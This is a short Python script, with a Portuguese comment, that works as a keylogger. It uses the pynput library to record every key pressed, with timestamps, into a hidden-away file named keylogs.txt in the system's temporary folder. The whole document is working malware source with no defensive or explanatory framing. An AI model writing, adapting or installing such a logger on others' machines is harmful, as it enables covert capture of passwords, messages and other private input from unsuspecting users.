from pynput.keyboard import Listener
import logging
import tempfile

#Cria um script na pasta temp da maquina e registra tudo que se clicou
logging.basicConfig(filename=(tempfile.gettempdir() + "\keylogs.txt"),
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


